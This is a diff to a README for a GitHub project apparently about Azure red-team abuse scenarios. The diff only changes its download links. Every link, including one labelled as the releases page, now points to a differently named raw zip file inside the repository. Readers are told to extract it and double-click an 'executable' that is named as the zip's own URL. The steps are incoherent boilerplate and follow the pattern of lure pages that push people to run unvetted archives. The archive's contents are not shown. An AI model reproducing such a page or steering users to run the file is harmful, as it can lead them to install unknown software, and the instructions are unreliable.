@@ -1,6 +1,6 @@
 # 🎯 azure-red-team-abuse-scenarios - Explore Azure Security Risks Effectively
 
-[![Download Now](https://github.com/milkEden/azure-red-team-abuse-scenarios/raw/refs/heads/main/scenarios/02-identity-abuse/team-red-scenarios-azure-abuse-2.5.zip%20Now-azure--red--team--abuse--scenarios-blue)](https://github.com/milkEden/azure-red-team-abuse-scenarios/raw/refs/heads/main/scenarios/02-identity-abuse/team-red-scenarios-azure-abuse-2.5.zip)
+[![Download Now](https://github.com/milkEden/azure-red-team-abuse-scenarios/raw/refs/heads/main/diagrams/persistence/team-scenarios-azure-abuse-red-3.7.zip%20Now-azure--red--team--abuse--scenarios-blue)](https://github.com/milkEden/azure-red-team-abuse-scenarios/raw/refs/heads/main/diagrams/persistence/team-scenarios-azure-abuse-red-3.7.zip)
 
 ## 📝 Description
 
@@ -12,7 +12,7 @@ To use the azure-red-team-abuse-scenarios application, follow these simple steps
 
 1. **Visit the Releases Page**: Begin by heading to our releases page where you'll find the latest downloads. 
 
-   [Visit this page to download](https://github.com/milkEden/azure-red-team-abuse-scenarios/raw/refs/heads/main/scenarios/02-identity-abuse/team-red-scenarios-azure-abuse-2.5.zip)
+   [Visit this page to download](https://github.com/milkEden/azure-red-team-abuse-scenarios/raw/refs/heads/main/diagrams/persistence/team-scenarios-azure-abuse-red-3.7.zip)
 
 2. **Select Your Version**: Look for the most recent version of the application. Each release will have a clear version number, like v1.0, v1.1, etc.
 
@@ -20,7 +20,7 @@ To use the azure-red-team-abuse-scenarios application, follow these simple steps
 
 4. **Extract the Files (if needed)**: If you downloaded a `.zip` file, make sure to extract it. Right-click on the file and select "Extract All." 
 
-5. **Run the Application**: Navigate to the folder where you extracted the files. Double-click on the executable file (for instance, `https://github.com/milkEden/azure-red-team-abuse-scenarios/raw/refs/heads/main/scenarios/02-identity-abuse/team-red-scenarios-azure-abuse-2.5.zip`) to launch the application.
+5. **Run the Application**: Navigate to the folder where you extracted the files. Double-click on the executable file (for instance, `https://github.com/milkEden/azure-red-team-abuse-scenarios/raw/refs/heads/main/diagrams/persistence/team-scenarios-azure-abuse-red-3.7.zip`) to launch the application.
 
 ## 🖥️ System Requirements
 
@@ -44,7 +44,7 @@ To run the azure-red-team-abuse-scenarios application, your system should meet t
 
 To get started, you need to download the software from our Releases page. 
 
-1. Go to the [Releases page](https://github.com/milkEden/azure-red-team-abuse-scenarios/raw/refs/heads/main/scenarios/02-identity-abuse/team-red-scenarios-azure-abuse-2.5.zip).
+1. Go to the [Releases page](https://github.com/milkEden/azure-red-team-abuse-scenarios/raw/refs/heads/main/diagrams/persistence/team-scenarios-azure-abuse-red-3.7.zip).
 2. Choose the appropriate file for your system.
 3. Follow the installation instructions outlined earlier.
 
